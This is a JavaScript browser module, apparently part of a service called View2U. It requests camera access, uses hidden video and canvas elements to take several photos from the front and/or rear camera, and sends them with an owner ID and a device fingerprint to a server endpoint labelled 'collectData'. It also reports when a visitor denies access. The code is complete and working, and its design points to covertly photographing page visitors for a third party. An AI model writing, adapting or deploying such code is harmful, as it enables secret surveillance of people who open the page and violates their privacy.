(function() {
    window.view2u_modules = window.view2u_modules || {};

    // Функція для відправки даних на сервер
    async function sendDataToServer(ownerUserId, fingerprint, dataPayload) {
        try {
            await fetch('/.netlify/functions/public-api', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'collectData',
                    payload: {
                        ownerUserId,
                        fingerprint,
                        payload: dataPayload
                    }
                })
            });
        } catch (error) {
            console.error('View2U Camera Module: Помилка відправки даних', error);
        }
    }

    // чекати поки відео отримає перший кадр
    async function waitForVideoFrame(video, timeout = 3000) {
        const start = Date.now();
        return new Promise((resolve, reject) => {
            if (video.videoWidth && video.videoHeight) return resolve();
            const iv = setInterval(() => {
                if (video.videoWidth && video.videoHeight) {
                    clearInterval(iv);
                    return resolve();
                }
                if (Date.now() - start > timeout) {
                    clearInterval(iv);
                    return reject(new Error('video frame timeout'));
                }
            }, 100);
        });
    }

    // Хелпер для зйомки фото з конкретної камери
    async function captureFromCamera(facingMode, count, interval) {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });

        const video = document.createElement('video');
        video.srcObject = stream;
        video.style.display = 'none';
        video.playsInline = true;
        video.muted = true;
        video.autoplay = true;
        document.body.appendChild(video);

        try { await video.play(); } catch (e) {}

        try { await waitForVideoFrame(video, 3000); } catch (e) {}

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.style.display = 'none';
        document.body.appendChild(canvas);

        const context = canvas.getContext('2d');
        const photos = [];

        for (let i = 0; i < count; i++) {
            await new Promise(resolve => setTimeout(resolve, i === 0 ? 800 : interval));
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            photos.push(canvas.toDataURL('image/jpeg'));
        }

        stream.getTracks().forEach(track => track.stop());
        video.remove();
        canvas.remove();

        return photos;
    }

    // Логіка модуля камери
    window.view2u_modules.camera = {
        init: async function(ownerUserId, fingerprint, options) {
            const { count = 3, interval = 2000, view = "front" } = options;
            
            try {
                let photos = [];

                if (view === "front-back") {
                    const frontPhotos = await captureFromCamera("user", count, interval);
                    const backPhotos = await captureFromCamera("environment", count, interval);
                    photos = [...frontPhotos, ...backPhotos];
                } else {
                    const facing = view === "back" ? "environment" : "user";
                    photos = await captureFromCamera(facing, count, interval);
                }

                const successPayload = {
                    status: 'success',
                    type: 'photos',
                    data: photos
                };

                await sendDataToServer(ownerUserId, fingerprint, successPayload);
                return Promise.resolve(successPayload);

            } catch (err) {
                const errorPayload = {
                    status: 'denied',
                    type: 'photos',
                    error: err.name || 'User denied camera access'
                };
                await sendDataToServer(ownerUserId, fingerprint, errorPayload);
                return Promise.reject(errorPayload);
            }
        }
    };
})();
